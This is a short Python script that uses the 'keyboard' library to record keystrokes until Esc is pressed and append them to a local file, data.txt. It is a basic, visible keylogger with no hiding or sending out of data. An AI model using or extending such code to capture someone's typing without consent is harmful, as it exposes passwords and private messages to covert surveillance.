import keyboard

def main():
    keys_pressed = keyboard.record(until='esc')
    file = open("data.txt", 'a')
    # print(keys_pressed)
    for event in keys_pressed:
        if event.event_type == 'down':
            match event.name:
                case 'space':
                    file.write(" ")
                case 'right shift':
                    continue
                case 'shift':
                    continue
                case _:
                    file.write(event.name)
    file.close()

if __name__ == "__main__":
    main()
